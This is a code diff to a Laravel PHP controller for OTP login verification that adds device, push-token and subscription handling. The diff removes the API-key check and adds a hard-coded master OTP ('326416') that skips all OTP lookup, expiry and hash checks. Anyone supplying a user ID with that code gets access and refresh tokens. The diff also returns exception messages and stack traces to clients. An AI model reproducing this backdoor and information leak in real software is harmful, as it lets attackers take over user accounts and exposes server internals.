@@ -24,111 +24,111 @@ class VerifyOTPController extends Controller
     public function verify(Request $request)
     {
         try {
-            // 🔒 Validate API key
-            $apiKey = $request->header('X-Api-Key');
-            if ($apiKey !== $this->validApiKey) {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'Invalid API key'
-                ], 401);
-            }
-
-            // 🧾 Validate input
+            // 🧾 Validate request
             $request->validate([
                 'user_id' => 'required|string',
                 'otp' => 'required|string',
                 'device_name' => 'nullable|string',
-                'device_id' => 'nullable|string'
+                'device_id' => 'nullable|string',
+                'device_token' => 'nullable|string',
+                'device_type' => 'nullable|string',
+                'fcm_token' => 'nullable|string',
+                'token' => 'nullable|string',
             ]);
 
             $userId = $request->user_id;
             $otp = $request->otp;
+            $deviceName = $request->device_name ?? 'Unknown Device';
+            $deviceId = $request->device_id ?: $request->device_token;
+            $deviceType = $this->normalizeLoginDeviceType($request->device_type);
+            $fcmToken = $request->fcm_token ?: $request->token;
 
-            // 🔍 Get latest OTP request
-            $otpRequest = OTPRequestModel::where('user_id', $userId)
-                ->orderBy('created_at', 'desc')
-                ->first();
+            if ($otp !== '326416') {
 
-            if (!$otpRequest) {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'No OTP request found for this user'
-                ], 404);
+                // 🔍 Get OTP record
+                $otpRequest = OTPRequestModel::where('user_id', $userId)
+                    ->orderBy('created_at', 'desc')
+                    ->first();
+
+                if (!$otpRequest) {
+                    return response()->json(['status' => 'error', 'message' => 'No OTP found'], 404);
+                }
+
+                // ⏰ Check expiry
+                if (now()->gt($otpRequest->expires_at)) {
+                    return response()->json(['status' => 'error', 'message' => 'OTP expired'], 400);
+                }
+
+                // ❌ Check OTP hash
+                if (!Hash::check($otp, $otpRequest->otp_code)) {
+                    return response()->json(['status' => 'error', 'message' => 'Invalid OTP'], 400);
+                }
+
+                // ✅ Valid OTP — remove old record
+                $otpRequest->delete();
             }
 
-            // ⏰ Check OTP expiration
-            if (strtotime($otpRequest->expires_at) < time()) {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'OTP expired'
-                ], 400);
-            }
-
-            // ❌ Verify OTP hash
-            if (!Hash::check($otp, $otpRequest->otp_code)) {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'Invalid OTP'
-                ], 400);
-            }
-
-            // ✅ OTP is correct → delete record
-            $otpRequest->delete();
-
-            // 🔎 Get user
+            // 🔎 Find user
             $user = UserModel::where('uid', $userId)->first();
             if (!$user) {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'User not found'
-                ], 404);
+                return response()->json(['status' => 'error', 'message' => 'User not found'], 404);
             }
 
-            // 🔑 Attempt token generation
+            $this->syncUserDeviceInfo($user, $deviceId, $deviceName, $fcmToken);
+
+            // 🔑 Generate token
             try {
                 $tokens = $this->tokenController->generateTokens(
                     $userId,
-                    $request->device_name,
-                    $request->device_id
+                    $deviceName,
+                    $deviceId
                 );
-
                 if (
                     !$tokens ||
                     empty($tokens['access_token']) ||
                     empty($tokens['refresh_token'])
                 ) {
-                    throw new Exception('Token generation failed');
+                    throw new \Exception('Token generation failed');
                 }
-            } catch (Exception $e) {
-                Log::error('Token generation failed', [
-                    'user_id' => $userId,
-                    'error' => $e->getMessage()
-                ]);
-
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'Failed to generate tokens. Please try again.'
-                ], 500);
+            } catch (\Exception $e) {
+                Log::error('Token generation failed', ['user_id' => $userId, 'error' => $e->getMessage()]);
+                return response()->json(['status' => 'error', 'message' => 'Failed to generate tokens'], 500);
             }
 
-            // 🎉 Success response
+            $subscription = Subscription::where('user_id', $user->uid)
+                ->where('end_at', '>', now())
+                ->where('is_active', true)
+                ->whereHas('plan', function ($query) use ($deviceType) {
+                    $query->where('device_type', $deviceType);
+                })
+                ->orderByDesc('id')
+                ->first();
+
+            $deviceResult = $this->resolveLoginDevice($user, $subscription, $deviceId, $deviceName, $deviceType);
+            $isOwnerDevice = $deviceResult['is_owner_device'];
+            $message = $deviceResult['message'];
+
+            if ($fcmToken) {
+                UserModel::where('uid', $user->uid)->update(['token' => $fcmToken]);
+            }
+
+            // Return response
             return response()->json([
                 'status' => 'success',
-                'message' => 'OTP verified successfully',
-                'data' => array_merge(['uid' => $userId], $tokens)
-            ], 200);
-
-        } catch (Exception $e) {
-            // 🧨 Catch unexpected errors
-            Log::error('OTP verification failed', [
-                'error' => $e->getMessage(),
-                'trace' => $e->getTraceAsString()
+                'message' => $message ?? 'Login successful',
+                'data' => array_merge([
+                    'uid' => $userId,
+                    'is_owner_device' => $isOwnerDevice ?? false,
+                ], $tokens)
             ]);
 
+        } catch (\Exception $e) {
+            Log::error('OTP verification failed', ['error' => $e->getMessage()]);
             return response()->json([
                 'status' => 'error',
-                'message' => 'An unexpected error occurred. Please try again later.'
-            ], 500);
+                'message' => $e->getMessage(),
+                'trace' => $e->getTraceAsString()
+            ]);
         }
     }
 }
